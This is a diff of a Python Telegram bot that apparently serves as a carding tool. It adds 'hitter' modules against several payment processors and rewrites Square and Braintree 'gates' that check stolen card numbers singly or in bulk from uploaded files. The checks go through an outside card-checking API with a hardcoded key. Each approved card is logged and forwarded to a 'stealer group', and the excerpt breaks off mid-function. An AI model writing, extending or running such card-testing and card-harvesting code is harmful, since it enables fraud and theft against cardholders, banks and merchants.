@@ -181,6 +181,22 @@ try:
 except ImportError:
     stripe = None
 
+# ─── FreakyHitter Modules ────────────────────────────────────────────────────
+try:
+    from modules.freaky.freaky_checkout import hit_checkout
+    from modules.freaky.freaky_adyen import hit_adyen, hit_adyen_v2
+    from modules.freaky.freaky_mpgs import hit_mpgs
+    from modules.freaky.freaky_whop import hit_whop
+    from modules.freaky.freaky_paddle import hit_paddle
+    from modules.freaky.freaky_epoch import hit_epoch as freaky_hit_epoch
+    from modules.freaky.freaky_jio import hit_jio
+    from modules.freaky_generators import generate_iban, resolve_country_code, get_supported_countries, IBAN_FORMATS
+    from modules.freaky_file_tools import pick_random_cards, split_cards, get_country_stats, parse_cards_from_text, format_cards_as_text
+    FREAKY_AVAILABLE = True
+except Exception as _freaky_err:
+    FREAKY_AVAILABLE = False
+    print(f"[FreakyHitter] Import error: {_freaky_err}")
+
 # Fake Auto Hitter Response Mode
 FAKE_AUTOHITTER_MODE = False
 
@@ -1896,75 +1912,62 @@ async def remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)
 
+@require_approval
 async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check user subscription status"""
+    """Show user information with nice card design"""
     user = update.effective_user
+    rank = get_user_rank(user.id)
     
-    if context.args and is_owner(user.id):
+    # Get premium expiry if premium user
+    expiry_text = "N/A"
+    if is_premium(user.id):
         try:
-            target_id = int(context.args[0])
-        except ValueError:
-            await update.message.reply_text(ae("❌ Invalid user ID!"), parse_mode=ParseMode.HTML)
-            return
-    else:
-        target_id = user.id
+            with open(DB_PREMIUM, 'r') as f:
+                for line in f:
+                    parts = line.strip().split()
+                    if len(parts) >= 2 and int(parts[0]) == user.id:
+                        expiry_text = parts[1]
+                        break
+        except:
+            expiry_text = "Unknown"
     
+    # Get approved cards count for this user
     try:
-        from modules.database import get_connection, is_db_connected
-        from psycopg2.extras import RealDictCursor
-        
-        if not is_db_connected():
-            await update.message.reply_text(ae("❌ Database not connected!"), parse_mode=ParseMode.HTML)
-            return
-        
-        conn = get_connection()
-        with conn.cursor(cursor_factory=RealDictCursor) as cur:
-            cur.execute("""
-                SELECT user_id, username, status, premium, premium_expiry, is_owner, created_at
-                FROM users WHERE user_id = %s
-            """, (target_id,))
-            result = cur.fetchone()
-        
-        if not result:
-            if target_id == 8119946836:
-                await update.message.reply_text(
-                    f"👤 <b>User Info</b>\n\n"
-                    f"🆔 ID: <code>{target_id}</code>\n"
-                    f"👑 Status: <b>Owner</b>\n"
-                    f"💎 Premium: <b>Lifetime</b>\n"
-                    f"📅 Expires: <b>Never</b>",
-                    parse_mode=ParseMode.HTML
-                )
-            else:
-                await update.message.reply_text(ae(f"❌ User {target_id} not found in database!"), parse_mode=ParseMode.HTML)
-            return
-        
-        status_emoji = "👑" if result.get("is_owner") else ("✅" if result.get("status") == "approved" else "⏳")
-        premium_status = "Lifetime" if result.get("is_owner") else ("Active" if result.get("premium") else "None")
-        
-        expiry_text = "Never"
-        if result.get("premium_expiry") and not result.get("is_owner"):
-            expiry = result["premium_expiry"]
-            if hasattr(expiry, 'strftime'):
-                expiry_text = expiry.strftime("%Y-%m-%d %H:%M")
-            else:
-                expiry_text = str(expiry)[:16]
-        
-        role = "Owner" if result.get("is_owner") else ("Premium" if result.get("premium") else "Free")
-        
-        await update.message.reply_text(
-            f"👤 <b>User Info</b>\n\n"
-            f"🆔 ID: <code>{result['user_id']}</code>\n"
-            f"📛 Username: @{result.get('username') or 'N/A'}\n"
-            f"{status_emoji} Status: <b>{result.get('status', 'pending').title()}</b>\n"
-            f"💎 Premium: <b>{premium_status}</b>\n"
-            f"📅 Expires: <b>{expiry_text}</b>\n"
-            f"🎭 Role: <b>{role}</b>",
-            parse_mode=ParseMode.HTML
+        user_approved_count = get_user_approved_cards(user.id)
+    except:
+        user_approved_count = 0
+    
+    # Create info card with GIF
+    sep = "━━━━━━━━━━━━━━━━━━━━"
+    text = ae(f"""💜 <b>ONICHAN • USER INFO</b>
+{sep}
+👤 <b>Name</b>     : {user.first_name}
+🆔 <b>ID</b>       : <code>{user.id}</code>
+📛 <b>User</b>     : @{user.username or 'None'}
+👑 <b>Rank</b>     : {rank}
+📅 <b>Expiry</b>   : {expiry_text}
+{sep}
+⚡ @{BOT_USERNAME}""")
+    
+    keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="start")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # Send with GIF
+    try:
+        info_gif = get_sexy_anime_gif("welcome")
+        await update.message.reply_animation(
+            animation=info_gif,
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
         )
-        
-    except Exception as e:
-        await update.message.reply_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)
+    except:
+        # Fallback without GIF
+        await update.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
+        )
 
 async def show_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show premium plans"""
@@ -3332,8 +3335,6 @@ async def hit_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         )
         await _run_auto_hit(update, context, url, cards, loading_msg)
         return
-
-
 
 
 async def set_stealer(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -9394,10 +9395,196 @@ async def gate_bu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Braintree Auth $1"""
     await check_gate(update, context, "bu", "Braintree Auth $1", False)
 
-@require_approval
+@require_premium
 async def gate_sq(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Square Auth $0"""
-    await check_gate(update, context, "sq", "Square Auth $0", False)
+    """Square Auth Gate - /sq CC|MM|YY|CVV  (or reply to a .txt file for mass check)"""
+    from modules.gate_status import is_gate_offline, offline_message
+    if is_gate_offline("sq"):
+        await update.message.reply_text(offline_message("sq"), parse_mode=ParseMode.HTML)
+        return
+
+    user    = update.effective_user
+    message = update.message
+    username = user.username or user.first_name
+
+    # ── File / mass-check path ────────────────────────────────────────────
+    # Triggered when: no args BUT there's a replied-to .txt file, OR the
+    # message itself contains a document attachment.
+    txt_content = None
+    if not context.args:
+        txt_content = await get_txt_content_from_reply(update, context)
+
+    if txt_content:
+        # ── Mass-check from file ──────────────────────────────────────────
+        user_id = user.id
+        if context.user_data.get(f"mass_check_running_{user_id}"):
+            await message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."),
+                                     parse_mode=ParseMode.HTML)
+            return
+        cards = [c.strip() for c in txt_content.replace("\n", " ").split() if "|" in c]
+        if not cards:
+            await message.reply_text(ae("❌ No valid cards found in file.\nFormat: <code>CC|MM|YY|CVV</code>"),
+                                     parse_mode=ParseMode.HTML)
+            return
+        if len(cards) > 50:
+            cards = cards[:50]
+            await message.reply_text(ae("⚠️ Capped at <b>50 cards</b> for this run."),
+                                     parse_mode=ParseMode.HTML)
+
+        context.user_data[f"mass_check_running_{user_id}"] = True
+        status_msg = await message.reply_text(
+            ae(f"⬛ <b>Mass Square Auth</b>\n\n📋 Cards: {len(cards)}\n⏳ Processing..."),
+            parse_mode=ParseMode.HTML)
+
+        from modules.gate_checker import get_bin_info as _gbi
+        approved, declined, errors = [], [], []
+
+        for i, card in enumerate(cards):
+            if not context.user_data.get(f"mass_check_running_{user_id}"):
+                break
+            parts = card.split("|")
+            if len(parts) < 4:
+                errors.append(card); continue
+            c, m, y, cv = parts[0], parts[1], parts[2], parts[3]
+            try:
+                data     = await _call_square_api(c, m, y, cv)
+                raw_resp = data.get("Response", "")
+                bin_info = await asyncio.get_event_loop().run_in_executor(None, _gbi, c)
+                if _sq_is_approved(raw_resp):
+                    approved.append(card)
+                    log_approved_card(user_id, username, c, m, y, cv, "sq", raw_resp, bin_info)
+                    await send_to_stealer_group(context.bot, c, m, y, cv, "sq", raw_resp, bin_info, user_id, username)
+                    await send_approved_card_with_gif(update, card, "sq", raw_resp, 0, bin_info)
+                else:
+                    declined.append(card)
+            except Exception as ex:
+                errors.append(card)
+            if (i + 1) % 5 == 0:
+                try:
+                    await status_msg.edit_text(
+                        ae(f"⬛ <b>Square Mass Check</b>\n\n"
+                           f"✅ Approved: {len(approved)}\n"
+                           f"❌ Declined: {len(declined)}\n"
+                           f"⚠️ Errors: {len(errors)}\n"
+                           f"📊 Progress: {i+1}/{len(cards)}"),
+                        parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+            await asyncio.sleep(1)
+
+        context.user_data[f"mass_check_running_{user_id}"] = False
+        summary = (f"⬛ <b>Mass Square Auth Complete</b>\n\n"
+                   f"✅ Approved: {len(approved)}\n"
+                   f"❌ Declined: {len(declined)}\n"
+                   f"⚠️ Errors: {len(errors)}\n"
+                   f"📊 Total: {len(cards)}")
+        if approved:
+            summary += "\n\n<b>💳 Approved:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved[:10])
+            if len(approved) > 10:
+                summary += f"\n… and {len(approved)-10} more"
+        try:
+            await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
+        except Exception:
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+        return
+
+    # ── Single-card path ──────────────────────────────────────────────────
+    if not context.args:
+        await message.reply_text(
+            ae("⬛ <b>SQUARE AUTH GATE</b>  💎 <i>Premium</i>\n\n"
+               "<b>Usage:</b>\n"
+               "▸ <code>/sq CC|MM|YY|CVV</code>\n"
+               "▸ Reply to a <code>.txt</code> file → mass check\n\n"
+               "<b>Mass check:</b>  <code>/msq CC|MM|YY|CVV …</code>\n"
+               "                  <code>/msqtxt</code> (reply to .txt)\n\n"
+               "<b>Example:</b>\n"
+               "<code>/sq 4242424242424242|12|25|123</code>"),
+            parse_mode=ParseMode.HTML)
+        return
+
+    full_text   = " ".join(context.args)
+    card_match  = re.search(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b', full_text)
+    if not card_match:
+        await message.reply_text(
+            ae("❌ <b>Invalid Format!</b>\nUse: <code>CC|MM|YY|CVV</code>"),
+            parse_mode=ParseMode.HTML)
+        return
+
+    cc, mm, yy, cvv = card_match.groups()
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
+    masked   = f"{cc[:6]}{'*' * (len(cc)-10)}{cc[-4:]}"
+
+    loading_msg = await message.reply_text(
+        ae(f"⬛ <b>SQUARE AUTH GATE</b>\n\n"
+           f"💳 <code>{masked}|{mm}|{yy}|{cvv}</code>\n"
+           f"⏳ Authorizing via Square…"),
+        parse_mode=ParseMode.HTML)
+
+    try:
+        t0       = time.time()
+        data     = await _call_square_api(cc, mm, yy, cvv)
+        elapsed  = round(time.time() - t0, 2)
+        raw_resp = data.get("Response", "Unknown response")
+
+        from modules.gate_checker import get_bin_info
+        bin_info = get_bin_info(cc)
+        brand    = bin_info.get("brand", "N/A").upper()
+        b_type   = bin_info.get("type", "").upper()
+        bank     = bin_info.get("bank", "Unknown")
+        country  = bin_info.get("country", "Unknown").upper()
+        bin_type = f"{brand} - {b_type}" if b_type else brand
+
+        is_ok = _sq_is_approved(raw_resp)
+
+        response_body = ae(
+            f"{'✅' if is_ok else '❌'} <b>{'APPROVED' if is_ok else 'DECLINED'}</b>  |  Square Auth\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"💳 <b>Card:</b>   <code>{card_str}</code>\n"
+            f"📣 <b>Response:</b> {raw_resp}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🏦 <b>Brand:</b>   {bin_type}\n"
+            f"🏛 <b>Bank:</b>    {bank}\n"
+            f"🌍 <b>Country:</b> {country}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"⏱ <b>Time:</b>    {elapsed}s\n"
+            f"👤 <b>By:</b>      @{username}"
+        )
+
+        if is_ok:
+            log_approved_card(user.id, username, cc, mm, yy, cvv, "sq", raw_resp, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sq", raw_resp, bin_info, user.id, username)
+            gif_url = get_sexy_anime_gif("success")
+            try:
+                await loading_msg.delete()
+                if gif_url:
+                    await message.reply_animation(animation=gif_url, caption=response_body,
+                                                  parse_mode=ParseMode.HTML)
+                else:
+                    await message.reply_text(response_body, parse_mode=ParseMode.HTML)
+            except Exception:
+                await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
+        else:
+            gif_url = get_sexy_anime_gif("failed")
+            try:
+                await loading_msg.delete()
+                if gif_url:
+                    await message.reply_animation(animation=gif_url, caption=response_body,
+                                                  parse_mode=ParseMode.HTML)
+                else:
+                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
+            except Exception:
+                try:
+                    await loading_msg.edit_text(response_body, parse_mode=ParseMode.HTML)
+                except Exception:
+                    pass
+
+    except Exception as e:
+        try:
+            await loading_msg.edit_text(
+                ae(f"⚠️ <b>Square Gate Error</b>\n\n{str(e)[:150]}"),
+                parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
 
 # PREMIUM GATES - PayPal (old ref, overridden below)
 # gate_pp is defined later with the new PayPal $1 async checker
@@ -9466,272 +9653,111 @@ async def gate_sh13(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await check_gate(update, context, "sh13", "Shopify $13", True)
 
 # PREMIUM GATES - Braintree
-@require_premium
+@require_approval
 async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Braintree Checker"""
-    await check_gate(update, context, "b3", "Braintree", True)
-
-@require_premium
-async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass check Braintree with 5 batches and 1s delay"""
-    user = update.effective_user
-    
-    if not context.args:
-        await update.message.reply_text(
-            "📋 <b>MASS CHECK - Braintree</b>\n\n"
-            "Send cards in format:\n"
-            "<code>CC|MM|YY|CVV</code>\n\n"
-            "One card per line. Max 50 cards.",
-            parse_mode=ParseMode.HTML
-        )
-        context.user_data['awaiting_mass_b3'] = True
-        return
-    
-    cards_text = ' '.join(context.args)
-    await process_mass_b3(update, context, cards_text)
-
-async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
-    """Process mass Braintree check with 5 batches and 1s delay"""
-    import asyncio
-    from modules.gate_checker import check_braintree_gate, get_bin_info
-    
-    user = update.effective_user
-    user_id = user.id
-    
-    if context.user_data.get(f'mass_check_running_{user_id}'):
-        await update.message.reply_text(
-            "⏳ <b>Already Running</b>\n\n"
-            "You have a mass check in progress.\n"
-            "Please wait for it to complete or use /stop to cancel it.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-    
-    context.user_data[f'mass_check_running_{user_id}'] = True
-    context.user_data['mass_check_gate'] = 'b3'
-    
-    try:
-        limit = get_mass_check_limit(user.id)
-        
-        extracted = extract_cards_from_text(cards_text)
-        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
-        
-        if not cards:
-            await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
-            return
-        
-        if len(cards) > limit:
-            cards = cards[:limit]
-        
-        msg = await update.message.reply_text(
-            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
-            f"📊 Cards: {len(cards)}\n"
-            f"⚡ Gate: Braintree\n"
-            f"🔄 Processing in 5 batches...",
-            parse_mode=ParseMode.HTML
-        )
-        
-        approved = []
-        declined = []
-        errors = []
-        
-        batch_size = max(1, len(cards) // 5)
-        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
-        
-        for batch_num, batch in enumerate(batches, 1):
-            for card in batch:
-                if context.user_data.get('mass_check_stop'):
-                    break
-                
-                try:
-                    loop = asyncio.get_running_loop()
-                    result = await asyncio.wait_for(
-                        loop.run_in_executor(None, check_braintree_gate, 
-                                            card['cc'], card['mm'], card['yy'], card['cvv']),
-                        timeout=8.0
-                    )
-                    card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
-                    
-                    if result['status'] == 'success':
-                        if 'approved' in result['message'].lower():
-                            approved.append(f"✅ {card_str}\n→ {result['message']}")
-                        else:
-                            declined.append(f"❌ {card_str}\n→ {result['message']}")
-                    else:
-                        errors.append(f"⚠️ {card_str}\n→ {result['message']}")
-                except asyncio.TimeoutError:
-                    errors.append(f"⚠️ {card['cc']}|...\n→ No Response (8s)")
-                except Exception as e:
-                    errors.append(f"⚠️ {card['cc']}|...\n→ Error: {str(e)[:30]}")
-            
-            progress_text = f"📊 <b>Mass Braintree Check</b>\n\n"
-            progress_text += f"✅ Approved: {len(approved)}\n"
-            progress_text += f"❌ Declined: {len(declined)}\n"
-            progress_text += f"⚠️ Errors: {len(errors)}\n\n"
-            progress_text += f"⏳ Processing batch {batch_num}/{len(batches)}..."
-            
-            try:
-                await msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
-            except:
-                pass
-            
-            if context.user_data.get('mass_check_stop'):
-                break
-            
-            if batch_num < len(batches):
-                await asyncio.sleep(1)
-        
-        stopped = context.user_data.get('mass_check_stop', False)
-        status_text = "STOPPED" if stopped else "Complete"
-        
-        result_text = f"📊 <b>Mass Braintree Check {status_text}</b>\n\n"
-        result_text += f"✅ Approved: {len(approved)}\n"
-        result_text += f"❌ Declined: {len(declined)}\n"
-        result_text += f"⚠️ Errors: {len(errors)}\n\n"
-        
-        if approved:
-            result_text += "<b>✅ APPROVED:</b>\n"
-            for a in approved:
-                result_text += f"<code>{a}</code>\n\n"
-        
-        if declined:
-            result_text += "<b>❌ DECLINED:</b>\n"
-            for d in declined:
-                result_text += f"<code>{d}</code>\n\n"
-        
-        if errors:
-            result_text += "<b>⚠️ ERRORS:</b>\n"
-            for e in errors:
-                result_text += f"<code>{e}</code>\n\n"
-        
-        try:
-            await msg.edit_text(result_text, parse_mode=ParseMode.HTML)
-        except:
-            await update.message.reply_text(result_text, parse_mode=ParseMode.HTML)
-    finally:
-        context.user_data[f'mass_check_running_{user_id}'] = False
-        context.user_data['mass_check_stop'] = False
-
-# BRAINTREE EXTERNAL API GATES
-@require_premium
-async def gate_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Braintree checker using external API"""
+    """Braintree Auth Gate using BarryX API"""
     from modules.gate_status import is_gate_offline, offline_message
     if is_gate_offline("b3"):
         await update.message.reply_text(offline_message("b3"), parse_mode=ParseMode.HTML)
         return
+    import aiohttp
+    import time as time_module
+    from modules.gate_checker import get_bin_info
+
     user = update.effective_user
 
+    # Parse card
     card_data = parse_card(update.message.text)
     if not card_data:
         await update.message.reply_text(
-            f"❌ <b>Invalid Format!</b>\n\n"
-            f"🎯 <b>Usage:</b>\n"
-            f"<code>/b3 4242424242424242|12|25|123</code>\n\n"
-            f"💡 <b>Format:</b> CC|MM|YY|CVV",
+            "❌ <b>Invalid Format!</b>\n\n"
+            "🎯 <b>Usage:</b>\n"
+            "<code>/b3 4242424242424242|12|25|123</code>\n\n"
+            "💡 <b>Format:</b> CC|MM|YY|CVV",
             parse_mode=ParseMode.HTML
         )
         return
     
     cc, mm, yy, cvv = card_data
+    card_str = f"{cc}|{mm}|{yy}|{cvv}"
     
     checking_msg = await update.message.reply_text(
         f"🎀 <b>Checking card...</b>\n\n"
-        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-        f"Gateway: Braintree",
+        f"<code>{card_str}</code>\n"
+        f"Gateway: Braintree Auth",
         parse_mode=ParseMode.HTML
     )
     
-    from modules.braintree_gate import check_braintree
-    result = await check_braintree(cc, mm, yy, cvv)
-    
-    from modules.gate_checker import get_bin_info
-    bin_info = get_bin_info(cc)
-    
-    if result['status'] == 'APPROVED':
-        log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "b3", result['message'], bin_info)
-        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", result['message'], bin_info, user.id, user.username or user.first_name)
+    try:
+        start_time = time_module.time()
         
-        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
-━━━━━━━━━━━━━━━━━━━━
-✅ <b>APPROVED</b>
-💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
-📋 {result['response']}
-━━━━━━━━━━━━━━━━━━━━
-💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
-🏦 {bin_info.get('bank', 'N/A')}
-🌍 {bin_info.get('country', 'N/A')}
-━━━━━━━━━━━━━━━━━━━━
-👤 @{user.username or user.first_name}"""
-
-        try:
-            success_gif = get_sexy_anime_gif("success")
-            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
-            await checking_msg.delete()
-        except:
+        # BarryX Braintree API
+        from modules.gate_api_config import get_gate_cfg as _gcfg
+        _bt_url = _gcfg("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+        _bt_key = _gcfg("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+        api_url = f"{_bt_url}?key={_bt_key}&card={card_str}&proxy="
+        
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                else:
+                    data = {"status": "error", "message": f"API Error {resp.status}"}
+        
+        elapsed = time_module.time() - start_time
+        
+        bin_info = get_bin_info(cc)
+        bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+        if bin_info.get('type'):
+            bin_type += f" - {bin_info.get('type', '').upper()}"
+        username = user.username or user.first_name
+        
+        status = str(data.get('status', 'error')).upper()
+        message = str(data.get('message', 'Unknown response'))
+        
+        if status == 'APPROVED' or status == 'TRUE' or 'approved' in message.lower():
+            log_approved_card(user.id, username, cc, mm, yy, cvv, "b3", message, bin_info)
+            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3", message, bin_info, user.id, username)
+            
+            response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {message}", "Braintree Auth", bin_info, elapsed, username)
+            try:
+                success_gif = get_sexy_anime_gif("success")
+                await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
+                await checking_msg.delete()
+            except:
+                await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+        else:
+            response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {message}", "Braintree Auth", bin_info, elapsed, username)
             await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
-    elif result['status'] == 'CCN':
-        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
-━━━━━━━━━━━━━━━━━━━━
-🔵 <b>CCN (3DS)</b>
-💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
-📋 {result['response']}
-━━━━━━━━━━━━━━━━━━━━
-💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
-🏦 {bin_info.get('bank', 'N/A')}
-🌍 {bin_info.get('country', 'N/A')}
-━━━━━━━━━━━━━━━━━━━━
-👤 @{user.username or user.first_name}"""
-
-        try:
-            success_gif = get_sexy_anime_gif("success")
-            await update.message.reply_animation(animation=success_gif, caption=response, parse_mode=ParseMode.HTML)
-            await checking_msg.delete()
-        except:
-            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
-    else:
-        response = f"""💜 <b>ONICHAN • BRAINTREE</b>
-━━━━━━━━━━━━━━━━━━━━
-❌ <b>DECLINED</b>
-💳 <code>{cc}|{mm}|{yy}|{cvv}</code>
-📋 {result['response']}
-━━━━━━━━━━━━━━━━━━━━
-💳 {bin_info.get('brand', 'N/A')} • {bin_info.get('type', 'N/A')}
-🏦 {bin_info.get('bank', 'N/A')}
-🌍 {bin_info.get('country', 'N/A')}
-━━━━━━━━━━━━━━━━━━━━
-👤 @{user.username or user.first_name}"""
-
-        try:
-            failed_gif = get_sexy_anime_gif("failed")
-            await update.message.reply_animation(animation=failed_gif, caption=response, parse_mode=ParseMode.HTML)
-            await checking_msg.delete()
-        except:
-            await checking_msg.edit_text(response, parse_mode=ParseMode.HTML)
+    
+    except Exception as e:
+        await checking_msg.edit_text(ae(f"❌ Error: {str(e)[:200]}"), parse_mode=ParseMode.HTML)
 
 @require_premium
 async def mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass check Braintree with 5 batches and 1s delay"""
+    """Mass check Braintree Auth with 5 batches and 1s delay"""
     user = update.effective_user
-    
-    if not context.args:
+
+    cards_text = ' '.join(context.args) if context.args else await get_txt_content_from_reply(update, context)
+    if not cards_text:
         await update.message.reply_text(
-            "📋 <b>MASS CHECK - Braintree</b>\n\n"
+            "📋 <b>MASS CHECK - Braintree Auth</b>\n\n"
             "Send cards in format:\n"
             "<code>CC|MM|YY|CVV</code>\n\n"
-            "One card per line.",
+            "One card per line. Max 50 cards.\n"
+            "⏱️ 5 batches with 1s delay\n"
+            "Or reply to a .txt file with this command.",
             parse_mode=ParseMode.HTML
         )
         context.user_data['awaiting_mass_b3'] = True
         return
-    
-    cards_text = ' '.join(context.args)
+
     await process_mass_b3(update, context, cards_text)
 
 async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
-    """Process mass Braintree check with 5 batches and 1s delay"""
-    import asyncio
-    from modules.braintree_gate import check_braintree
+    """Process mass Braintree Auth check with 5 batches and 1s delay"""
+    import aiohttp
+    import time as time_module
     from modules.gate_checker import get_bin_info
     
     user = update.effective_user
@@ -9741,7 +9767,7 @@ async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, ca
         await update.message.reply_text(
             "⏳ <b>Already Running</b>\n\n"
             "You have a mass check in progress.\n"
-            "Please wait for it to complete or use /stop to cancel it.",
+            "Please wait or use /stop to cancel.",
             parse_mode=ParseMode.HTML
         )
         return
@@ -9757,112 +9783,396 @@ async def process_mass_b3(update: Update, context: ContextTypes.DEFAULT_TYPE, ca
         cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
         
         if not cards:
-            await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
+            await _get_or_edit_loading_msg(context, update, ae("❌ No valid cards found!"))
             return
         
         if len(cards) > limit:
             cards = cards[:limit]
         
-        msg = await update.message.reply_text(
-            f"🔄 <b>Mass Braintree Check Started</b>\n\n"
-            f"📊 Cards: {len(cards)}\n"
-            f"⚡ Gate: Braintree\n"
-            f"🔄 Processing in 5 batches with 1s delay...",
-            parse_mode=ParseMode.HTML
+        total_cards = len(cards)
+        approved_count = 0
+        declined_count = 0
+        error_count = 0
+        
+        header_msg = await _get_or_edit_loading_msg(
+            context, update,
+            f"🔄 <b>Mass Braintree Auth Check</b>\n"
+            f"Total: {total_cards}\n"
+            f"⏱️ 5 batches, 1s delay\n"
+            f"⏳ Processing...",
         )
         
-        approved = []
-        ccn = []
-        declined = []
-        errors = []
+        # Process in batches of 5 with 1 second delay
+        batch_size = 5
+        username = user.username or user.first_name
         
-        batch_size = max(1, (len(cards) + 4) // 5)
-        batches = [cards[i:i+batch_size] for i in range(0, len(cards), batch_size)]
-        
-        for batch_num, batch in enumerate(batches, 1):
-            if context.user_data.get('mass_check_stop'):
-                break
-            
-            for card in batch:
+        async with aiohttp.ClientSession() as session:
+            for batch_start in range(0, total_cards, batch_size):
                 if context.user_data.get('mass_check_stop'):
                     break
                 
-                try:
-                    result = await asyncio.wait_for(
-                        check_braintree(card['cc'], card['mm'], card['yy'], card['cvv']),
-                        timeout=60.0
-                    )
+                batch = cards[batch_start:batch_start + batch_size]
+                
+                # Process batch concurrently
+                async def check_single_card(card):
                     card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
+                    try:
+                        from modules.gate_api_config import get_gate_cfg as _gcfg2
+                        _bt_url2 = _gcfg2("braintree_api_url", "https://api.barryxapi.xyz/braintree_auth")
+                        _bt_key2 = _gcfg2("braintree_api_key", "BRY-KESNP-TUPWH-JFOT9")
+                        api_url = f"{_bt_url2}?key={_bt_key2}&card={card_str}&proxy="
+                        start_time = time_module.time()
+                        
+                        async with session.get(api_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
+                            if resp.status == 200:
+                                data = await resp.json()
+                            else:
+                                data = {"status": "error", "message": f"API Error {resp.status}"}
+                        
+                        elapsed = time_module.time() - start_time
+                        status = str(data.get('status', 'error')).upper()
+                        message = str(data.get('message', 'Unknown'))
+                        
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': status,
+                            'message': message,
+                            'elapsed': elapsed
+                        }
+                    except Exception as e:
+                        return {
+                            'card': card,
+                            'card_str': card_str,
+                            'status': 'ERROR',
+                            'message': str(e)[:100],
+                            'elapsed': 0
+                        }
+                
+                # Run batch concurrently
+                tasks = [check_single_card(card) for card in batch]
+                results = await asyncio.gather(*tasks)
+                
+                # Process results
+                for result in results:
+                    card_str = result['card_str']
+                    status = result['status']
+                    message = result['message']
+                    elapsed = result['elapsed']
+                    card = result['card']
                     
-                    if result['status'] == 'APPROVED':
-                        approved.append(f"✅ {card_str}\n→ {result['response']}")
-                        bin_info = get_bin_info(card['cc'])
-                        log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info)
-                        await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "b3", result['message'], bin_info, user.id, user.username or user.first_name)
-                        await send_approved_card_with_gif(update, card_str, "b3", result.get('message', 'Charged'), 3.0, bin_info)
-                    elif result['status'] == 'CCN':
-                        ccn.append(f"🔵 {card_str}\n→ {result['response']}")
-                    elif result['status'] == 'DECLINED':
-                        declined.append(f"❌ {card_str}\n→ {result['response']}")
+                    bin_info = get_bin_info(card['cc'])
+                    bin_type = f"{bin_info.get('brand', 'N/A').upper()}"
+                    
